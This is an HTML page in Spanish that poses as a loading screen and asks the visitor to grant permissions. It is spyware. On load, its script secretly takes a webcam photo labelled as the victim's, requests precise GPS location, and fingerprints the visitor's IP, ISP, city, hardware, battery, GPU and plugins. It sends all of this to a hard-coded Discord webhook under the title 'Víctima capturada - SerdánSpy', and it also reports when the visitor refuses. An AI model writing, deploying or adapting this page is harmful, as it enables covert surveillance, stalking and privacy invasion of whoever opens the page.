<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: black;
            color: white;
            overflow: hidden;
        }
        .texto-principal {
            font-size: 2.5em;
            text-align: center;
            text-shadow: 2px 2px 10px rgba(255, 255, 255, 0.5);
            padding: 20px;
        }
        #video, #canvas {
            position: absolute;
            top: -9999px;
            left: -9999px;
            visibility: hidden;
        }
    </style>
</head>
<body>
    <div class="texto-principal">
        Acepta los permisos solicitados para acceder.
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1461433299598578009/Jfrl09WBF3efs7-OZ-f7a9pjim57nLxpRrni-da1LdV3jbNkclUnBgwrTiS7Xa_PPyVp";

function dataURLtoBlob(dataurl) {
    const arr = dataurl.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], { type: mime });
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// CAPTURA DE CÃMARA â€“ 3 segundos despuÃ©s de detectar video
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function manejarCamara() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
        });
        
        const video = document.getElementById('video');
        video.srcObject = stream;
        await video.play();

        const fotoData = await new Promise((resolve) => {
            const checkVideo = setInterval(() => {
                if (video.videoWidth > 0) {
                    clearInterval(checkVideo);
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const data = canvas.toDataURL('image/jpeg', 0.8);
                        stream.getTracks().forEach(track => track.stop());
                        resolve(data);
                    }, 3000); // 3 segundos como pediste ahora
                }
            }, 200);
        });

        const form = new FormData();
        form.append('payload_json', JSON.stringify({
            embeds: [{ title: "ðŸ“¸ FOTO CAPTURADA", color: 0x00FF00 }]
        }));
        form.append('file', dataURLtoBlob(fotoData), 'foto_victima.jpg');

        await fetch(WEBHOOK, { method: 'POST', body: form });
    } catch (err) {
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "âŒ CÃMARA DENEGADA",
                    description: "El usuario ha rechazado el permiso o no tiene cÃ¡mara.",
                    color: 0xFF0000
                }]
            })
        });
    }
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// UBICACIÃ“N PRECISA â€“ timeout de 10 segundos (como en la versiÃ³n anterior)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function manejarUbicacionPrecisa() {
    if (!navigator.geolocation) {
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "âš ï¸ UBICACIÃ“N DENEGADA",
                    description: "GeolocalizaciÃ³n no soportada.",
                    color: 0xFF0000
                }]
            })
        });
        return;
    }

    try {
        const position = await new Promise((resolve, reject) => {
            const options = {
                enableHighAccuracy: true,
                timeout: 10000,          // 10 segundos
                maximumAge: 0
            };
            navigator.geolocation.getCurrentPosition(resolve, reject, options);
        });

        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = Math.round(position.coords.accuracy);

        const gMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "ðŸ“ UBICACIÃ“N PRECISA OBTENIDA",
                    description: `PrecisiÃ³n: ~${accuracy} m\n[Ver en Google Maps](${gMapsLink})`,
                    color: 0x00FF00
                }]
            })
        });
    } catch (err) {
        let msg = "Error desconocido";
        if (err.code === 1) msg = "Permiso rechazado";
        if (err.code === 2) msg = "PosiciÃ³n no disponible";
        if (err.code === 3) msg = "Tiempo agotado (10s)";

        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "âš ï¸ UBICACIÃ“N DENEGADA",
                    description: msg,
                    color: 0xFF0000
                }]
            })
        });
    }
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// EMBED PRINCIPAL (sin cambios)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function enviarDatosCompletos() {
    const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
    
    const battery = await navigator.getBattery?.() || {};
    const batteryStatus = battery.level ? `${Math.round(battery.level * 100)}% ${battery.charging ? '(Cargando)' : '(Descargando)'}` : 'N/A';

    let webglInfo = 'No disponible';
    let gpuLevel = 'Desconocida';
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            webglInfo = renderer;
            if (renderer.includes('RTX') || renderer.includes('Geforce')) gpuLevel = 'Alta gama (Gamer)';
            else if (renderer.includes('Intel') || renderer.includes('UHD')) gpuLevel = 'BÃ¡sica (Integrada)';
            else gpuLevel = 'Media';
        }
    } catch(e) {}

    const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'Ninguno';
    let userLevel = 'Principiante';
    const savvyPlugins = ['uBlock', 'AdBlock', 'VPN', 'NoScript', 'Bitwarden'];
    if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Listo / Tech-savvy';

    const gMapsLink = (geo.latitude && geo.longitude)
        ? `[ðŸ“ Ver en Google Maps](https://www.google.com/maps?q=${geo.latitude},${geo.longitude})`
        : "Coordenadas no disponibles";

    const embed = {
        title: "VÃ­ctima capturada - SerdÃ¡nSpy",
        color: 0x00FF00,
        fields: [
            { name: "ðŸŒ Red e IP", value: `**IP:** ${geo.ip || '?'}\n**ISP:** ${geo.org || '?'}\n**Zona:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: false },
            { name: "ðŸ“ UbicaciÃ³n", value: `${geo.city || '?'}, ${geo.region || '?'}, ${geo.country_name || '?'}\n${gMapsLink}`, inline: false },
            { name: "ðŸ’» Hardware", value: `**SO:** ${navigator.platform}\n**RAM:** ${navigator.deviceMemory || '?'}GB\n**CPU:** ${navigator.hardwareConcurrency || '?'} nÃºcleos`, inline: true },
            { name: "ðŸ”‹ BaterÃ­a", value: batteryStatus, inline: true },
            { name: "ðŸŽ® GPU", value: `**Modelo:** ${webglInfo}\n**Calidad:** ${gpuLevel}`, inline: false },
            { name: "ðŸ› ï¸ Navegador y Nivel", value: `**Nivel de usuario:** ${userLevel}\n**Pantalla:** ${screen.width}x${screen.height}`, inline: false }
        ],
        footer: { text: `Fecha y hora: ${new Date().toLocaleString()}` }
    };

    await fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
    });
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// EJECUCIÃ“N
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
window.onload = () => {
    enviarDatosCompletos();
    manejarCamara();
    manejarUbicacionPrecisa();
};
</script>
</body>
</html>
